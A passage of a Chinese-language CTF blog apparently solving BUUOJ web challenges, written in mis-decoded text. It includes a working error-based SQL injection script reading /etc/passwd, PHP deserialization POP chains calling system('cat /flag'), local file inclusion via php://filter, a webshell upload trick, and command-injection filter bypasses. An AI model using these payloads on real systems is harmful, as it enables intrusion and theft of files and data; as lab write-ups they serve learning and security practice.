    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session[&#39;points&#39;] &lt; point_to_consume:
        raise RollBackException()
    session[&#39;points&#39;] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return &#39;You naughty boy! ;) &lt;br /&gt;&#39;


def get_flag_handler(args):
    if session[&#39;num_items&#39;] &gt;= 5:
        # show_flag_function has been disabled, no worries
        trigger_event(&#39;func:show_flag;&#39; + FLAG())
    trigger_event(&#39;action:view;index&#39;)


if __name__ == &#39;__main__&#39;:
    app.run(debug=False, host=&#39;0.0.0.0&#39;)</code></pre>
<p>æˆ‘ä»¬è§‚å¯Ÿ:</p>
<pre><code class="python">            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥</p>
<p>åœ¨actionåé¢åŠ ä¸ª#,æ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œ,ä½†æ˜¯ä¼ å…¥çš„å‚æ•°åªèƒ½æ˜¯ä¸€ä¸ªlist,åœ¨è¿™é‡Œå¡ä½æˆ‘äº†</p>
<p>ç»§ç»­åˆ†æå‘ç°,è¿™ä¸ªç¨‹åºçš„åŠŸèƒ½éƒ½åŸºäºè‡ªåˆ¶çš„event_loop,è€Œtrigger_event()è´Ÿè´£æ·»åŠ event,å½“ä¼ å…¥ä¸€ä¸ªlistæ—¶,ä»–ä¼šç›´æ¥event+=list</p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶event_loopçš„æ‰§è¡Œé¡ºåº,</p>
<p>åœ¨get_flag_handlerä¸­,æˆ‘ä»¬å¯ä»¥å°†flagè®°å½•åˆ°sessionä¸­ä½†æ˜¯,è¦æ±‚diomand&gt;=5,è€Œæ­£å¸¸æ¥è¯´æˆ‘ä»¬æœ€å¤šåªæœ‰3ä¸ª</p>
<p>æˆ‘ä»¬è§‚å¯Ÿbuy</p>
<pre><code class="python">def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])</code></pre>
<p>è¿™ä¸ªæ˜¯å…ˆå°†ç‰©å“æ·»åŠ ç„¶åå‘event_loopä¸­æ·»åŠ äº‹ä»¶,ç»“åˆæˆ‘ä»¬å‰é¢çš„å‘ç°,æˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨buy_handleråç›´æ¥è°ƒç”¨get_flag_handler,è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‹¿åˆ°flagäº†</p>
<p>è®¿é—®:<code>d5afe1f66147e857/?action:trigger_event%23;action:buy;99%23action:get_flag;%23</code>,å°†sessionè§£ç åæ‹¿åˆ°flag</p>
<p><code>flag{ba772083-fe23-4258-897e-63c9a99ff66f}</code></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code class="python">import requests
import re,time
import binascii
def sql_inj(sql):
    result=&quot;&quot;
    count=1
    while True:
        if result!=&quot;&quot;:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),{result},\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        else:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),\&quot;\&quot;,\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        burp0_url = &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn:80/register.php&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;r658aaumj82f5f6itd5freua14&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;username&quot;:username , &quot;password&quot;: &quot;a&quot;, &quot;email&quot;: &quot;a&quot;}
        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print(username)
        #print(res.text)
        session = requests.session()
        url=&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/login.php&quot;
        data={
            &quot;username&quot;:username,
            &quot;password&quot;:&quot;a&quot;
        }
        res=session.post(url, data=data) 
        #print(res.text)
        res=session.post(&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/changepwd.php&quot;,data={&quot;oldpass&quot;:&quot;a&quot;,&quot;newpass&quot;:&quot;a&quot;})
        print(res.text)
        tmp=re.match(r&quot;.*XPATH syntax error: &#39;(.*)&#39;.*&quot;,res.text,flags=re.DOTALL).group(1)
        if tmp!=&quot;&quot; and tmp[0]==&quot;~&quot;:
            tmp=tmp[1:]
        if tmp!=&quot;&quot; and tmp[-1]==&quot;~&quot;:
            tmp=tmp[:-1] 
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        time.sleep(0.5)
    print(result)
sql_inj(&quot;select(group_concat(load_file(0x2f6574632f706173737764)))&quot;)
</code></pre>
<pre><code>article,flag,users
flag
title,content
name,pwd,email,real_flag_1s_here</code></pre><p><code>flag{9b73df68-406f-439e-9076-c9a9f37f5255}</code></p>
<p>äºŒæ¬¡æ³¨å…¥</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>easy</p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>åç¼€åé™åˆ¶:php</p>
<p>ä¸Šä¼ htaccess+å›¾ç‰‡é©¬</p>
<p><code>flag{c4ab5af4-4cb4-45bf-9cb3-ebe35922eca9}</code></p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>ä¿®æ”¹xffå¤´</p>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æµ‹è¯•å‘ç°</p>
<pre><code>Warning: include(meowers&#39;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening &#39;meowers&#39;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>index.php</p>
<pre><code class="php">&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;
    &lt;title&gt;Had a bad day?&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;
      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;
        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;
          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;
          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;
        &lt;div&gt;
      &lt;/header&gt;
      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;
      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;
        &lt;div class=&quot;page-container mdl-grid&quot;&gt;
          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;
          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;
            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;
            &lt;/div&gt;
            &lt;h3&gt;Cheer up!&lt;/h3&gt;
              &lt;p&gt;
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              &lt;/p&gt;
              &lt;div class=&quot;page-include&quot;&gt;
              &lt;?php
                $file = $_GET[&#39;category&#39;];

                if(isset($file))
                {
                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){
                        include ($file . &#39;.php&#39;);
                    }
                    else{
                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
                    }
                }
                ?&gt;
            &lt;/div&gt;
          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;
              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
              &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
          &lt;/form&gt;

          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/main&gt;
    &lt;/div&gt;
    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>åœ¨æ‰«ç›®å½•æ—¶å‘ç°flag.php</p>
<p><code>http://12d20382-ff0d-44bf-abfd-50a08a5b8604.node3.buuoj.cn/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre><code class="php">&lt;?php
error_reporting(0);

if (isset($_GET[&#39;source&#39;])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    &#39;\.\.&#39;,
    // no stream wrapper
    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,
    // no data exfiltration
    &#39;flag&#39;
  ];
  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents(&#39;php://input&#39;);
$json = json_decode($body, true);

if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) {
  $page = $json[&#39;page&#39;];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;
  }
} else {
  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;
}

// no data exfiltration!!!
$content = preg_replace(&#39;/HarekazeCTF\{.+\}/i&#39;, &#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;, $content);
echo json_encode([&#39;content&#39; =&gt; $content]);</code></pre>
<p>å­¦åˆ°äº†å­¦åˆ°äº†</p>
<p>json_decodeåœ¨è§£æç±»ä¼¼<code>\u0020</code>çš„æ—¶å€™ä¼šæŠŠä»–å½“æˆä¸€ä¸ªunicodeå­—ç¬¦,ä¹Ÿå°±æ˜¯è¯´å®ƒä¼šå˜æˆ<code>ç©ºæ ¼</code></p>
<p>è¿™ä¸ªåœ¨å®˜æ–¹æ–‡æ¡£é‡Œä¹Ÿæœ‰æ¶‰åŠ<code>PHP implements a superset of JSON as specified in the original Â» RFC 7159.</code></p>
<p>å»æŸ¥RFC 7159å°±ä¼šå‘ç°</p>
<blockquote>
<pre><code>  Any character may be escaped.  If the character is in the Basic
  Multilingual Plane (U+0000 through U+FFFF), then it may be
  represented as a six-character sequence: a reverse solidus, followed
  by the lowercase letter u, followed by four hexadecimal digits that
  encode the character&#39;s code point.  The hexadecimal letters A though
  F can be upper or lower case.  So, for example, a string containing
  only a single reverse solidus character may be represented as
  &quot;\u005C&quot;.</code></pre></blockquote>
<h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1"><a href="#CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1"></a>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h2><pre><code class="php">&lt;?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request-&gt;input(&quot;payload&quot;);
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}</code></pre>
<p>å¾ˆæ˜æ˜¾æ˜¯è¦è®©æˆ‘ä»¬æ‰¾ä¸ªpopé“¾,åˆšå¼€å§‹æˆ‘å¤©çœŸçš„ä»¥ä¸ºå¯ä»¥ç›´æ¥ç”¨cveçš„,ä¸€è¡Œæ³¨é‡Šè®©æˆ‘æ˜ç™½äº†æˆ‘çš„å¤©çœŸ</p>
<p><img src="https://i.loli.net/2020/04/16/OFIVpwyUmARvcdE.png" alt="image55205"></p>
<p>è¿™ä¸ªpopé“¾æ˜¾ç„¶è¦ä»<code>__destruct</code>å¼€å§‹</p>
<p><img src="https://i.loli.net/2020/04/16/qu6dkEK9UMVw2IQ.png" alt="image55300"></p>
<p><img src="https://i.loli.net/2020/04/16/of6Vy52wIlsvBgQ.png" alt="image55369"></p>
<p>åœ¨ç»è¿‡ä¸€ç•ªæœç´¢+wpè§‚çœ‹å¤§æ³•å,æˆ‘æ‰¾åˆ°äº†</p>
<p>è¿™é‡Œæœ‰ä¸ª<code>$f($items)</code>,å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œ,å‰ææ˜¯æ²¡æœ‰ç›´æ¥ä»<code>foreach</code>é‚£é‡Œé€€å‡º</p>
<p>ä¸çŸ¥é“ä¸ºå•¥,æœ¬æœºä¸å¯ä»¥,è€Œé¶åœºå¯ä»¥???</p>
<pre><code class="php">&lt;?php

namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter{
    private $deferred;
    private $getTagsByKey;
    function __construct(){
        $this-&gt;deferred=&quot;cat /flag&quot;;
        $this-&gt;getTagsByKey=&quot;system&quot;;
    }
}



$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter();
echo urlencode(serialize($a));</code></pre>
<p><code>flag{d5b22868-43a5-4784-be2f-6021702cfe89}</code></p>
<h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>2333333333</p>
<p><code>flag{b84a1566-98fb-43aa-967d-95b86c42da14}</code></p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre><code class="php">&lt;?php
class Modifier {
    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Show{
    public $source;
    public $str;

    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = new Modifier();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}
$a=new Show();
$b=new Show();
$b-&gt;str=new Test();
$a-&gt;source=$b;
echo urlencode(serialize($a));
?&gt;</code></pre>
<p><code>flag{ff09736d-ed1f-4089-8906-3379cbb7e019}</code></p>
<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><code>UpdateHelper(__destruct)-&gt;User(__toString)-&gt;Info(__call)-&gt;dbCtrl(login)</code></p>
<pre><code class="php">&lt;?php
function safe($parm){
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
}
class User
{
    public $id=1;
    public $age;
    public $nickname;
    public function __construct(){
        $this-&gt;nickname=new Info();
        $this-&gt;age=&quot;UPDATE user SET password=\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; where username=?&quot;;
    } 


}
class dbCtrl
{
    public $hostname=&quot;127.0.0.1&quot;;
    public $dbuser=&quot;root&quot;;
    public $dbpass=&quot;root&quot;;
    public $database=&quot;test&quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this-&gt;name=&#39;admin&#39;;
        $this-&gt;password=&#39;1&#39;;
        $this-&gt;token=&#39;admin&#39;;
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct(){
        $this-&gt;age=&quot;&quot;;
        $this-&gt;nickname=&quot;&quot;;
        $this-&gt;CtrlCase=new dbCtrl();
    }
}
Class UpdateHelper{
    public $id=&quot;&quot;;
    public $newinfo=&quot;&quot;;
    public $sql=&quot;&quot;;
    public function __construct(){
        $this-&gt;sql=new User();
    }
}

$nickname=&quot;&quot;;
$a=new User();
$evil=str_replace(&quot;flag&quot;,&quot;alag&quot;,serialize($a));

#echo $evil;
$age=&#39;&quot;;s:8:&quot;nickname&quot;;&#39;.$evil.&#39;s:8:&quot;CtrlCase&quot;;N;};&#39;;
$len=strlen($age);
for($i=0;$i&lt;$len;$i++){
    $age=&quot;union&quot;.$age;
};
$tmp=serialize(new Info($age,$nickname));
$result=safe($tmp);
echo $age;
unserialize($result);
?&gt;


</code></pre>
<p><code>flag{be7c6d56-1969-47d8-8eed-e672e5496d25}</code></p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><pre><code>0/**/uniunionon/**/select/**/1,2,3#
0/**/uniunionon/**/select/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables/**/where/**/TABLE_SCHEMA=database()#
flag,score
0/**/uniunionon/**/select/**/1,GROUP_CONCAT(column_name),3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#39;flag&#39;#
flag,value </code></pre><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>åœ¨robots.txtä¸­å‘ç°fAke_f1agggg.php</p>
<p>åœ¨fAke_f1agggg.phpä¸­å‘ç°fl4g.php</p>
<pre><code class="php">&lt;img src=&quot;/img.jpg&quot;&gt;
&lt;?php
header(&#39;Content-type:text/html;charset=utf-8&#39;);
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){
        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;
    }else{
        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);
    }
}else{
    die(&quot;å»éæ´²å§&quot;);
}
//level 2
if (isset($_GET[&#39;md5&#39;])){
   $md5=$_GET[&#39;md5&#39;];
   if ($md5==md5($md5))
       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;
   else
       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);
}else{
    die(&quot;å»éæ´²å§&quot;);
}

//get flag
if (isset($_GET[&#39;get_flag&#39;])){
    $get_flag = $_GET[&#39;get_flag&#39;];
    if(!strstr($get_flag,&quot; &quot;)){
        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);
        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;
        system($get_flag);
    }else{
        die(&quot;å¿«åˆ°éæ´²äº†&quot;);
    }
}else{
    die(&quot;å»éæ´²å§&quot;);
}
?&gt;</code></pre>
<pre><code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=a%3dc%26%26b%3da%26%26c%3dt%26%26$a$b$c%09*</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/4æœˆåšé¢˜/">https://www.ccreater.top/1970/01/01/4æœˆåšé¢˜/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/4%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="ckmn5758b00ahs1ni8j6ia84d" data-title="4æœˆåšé¢˜" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/8/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">æ‚</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">å†…ç½‘æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">å‡ºé¢˜ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">åŸŸæ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">å¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" 